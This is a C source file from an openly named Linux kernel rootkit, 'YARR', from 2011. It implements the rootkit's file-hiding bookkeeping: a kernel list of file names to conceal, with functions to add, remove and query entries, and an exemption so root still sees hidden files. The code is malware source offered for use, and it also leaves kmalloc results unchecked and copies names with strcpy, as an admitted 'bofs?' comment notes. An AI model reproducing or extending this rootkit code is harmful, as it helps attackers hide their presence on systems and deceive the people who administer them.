/*
 *  YARR - Yet Another Repetitive Rootkit
 *  Copyright (C) 2011 Ole 
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 1, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

#include <linux/string.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/types.h>

#include "hidefile.h"
#include "debug.h"

// TODO: Handle properly symlinks to hidden files.

// TODO: From whom a file should be hidden?.

struct hide_file {
	struct list_head list;
	char *name;
} hide_files_list;

/***
 * For debugging purposes. Prints the list of files.
 */
void print_hide_files(void) {
	struct list_head *pos;
	struct hide_file *curr;

	debug("-------------------- Hide files ------------------------\n");
	list_for_each(pos, &hide_files_list.list) {
		curr = list_entry(pos, struct hide_file, list);
		debug("%s\n", curr->name);
	}

	debug("--------------------------------------------------------\n");
	return;
}

void init_hidefile() {
	INIT_LIST_HEAD(&hide_files_list.list);
}

void exit_hidefile() {
	struct list_head *pos, *n;
	struct hide_file *curr;
	
	// Free all the memory taken for the active hidden files.
	list_for_each_safe(pos, n, &hide_files_list.list) {
		curr = list_entry(pos, struct hide_file, list);
		list_del(pos);
		kfree(curr->name);
		kfree(curr);
	}
}

int hideFile(const char *name) {
	int res = -1;
	struct hide_file *tmp;
	unsigned int name_size;

	// Allocate a new struct hide_file structure to maintain this new path,
	// just if it wasn't previously hide.
	if (!isFileHidden(name)) {
		tmp = (struct hide_file *)kmalloc(sizeof(struct hide_file), GFP_KERNEL);

		// Ummm... bofs? Hope not.
		name_size = (strlen(name) + 1) * sizeof(char);
		tmp->name = (char *)kmalloc(name_size, GFP_KERNEL);
		strcpy(tmp->name, name);

		list_add(&(tmp->list), &(hide_files_list.list));
		res = 0;
	}

	print_hide_files();
	return res;
}

int stopHideFile(const char *name) {
	int res = -1;
	struct list_head *pos, *n;
	struct hide_file *curr;
	
	// Search the file passed inside the list, if we find it then remove it from
	// the list and free those chuck of memory allocated when the file was hidden.
	list_for_each_safe(pos, n, &hide_files_list.list) {
		curr = list_entry(pos, struct hide_file, list);
		if (strcmp(name, curr->name) == 0) {
			list_del(pos);
			kfree(curr->name);
			kfree(curr);
			res = 0;
		}
	}

	print_hide_files();
	return res;
}

int isFileHidden(const char *name) {
	struct list_head *pos;
	struct hide_file *curr;
	int res = 0;

	// Iterate over the list searching the file passed.
	list_for_each(pos, &hide_files_list.list) {
		curr = list_entry(pos, struct hide_file, list);
		if (strcmp(name, curr->name) == 0)
			res = 1;
	}

	// TODO: Right now root can find every file, of course this would change
	// in the future.
	// Even a file being hidden is revealed if one of these conditions meet:
	// - Root is looking for it (root privileges in fact).
	if (current->cred->euid == 0)
		res = 0;

	return res;
}

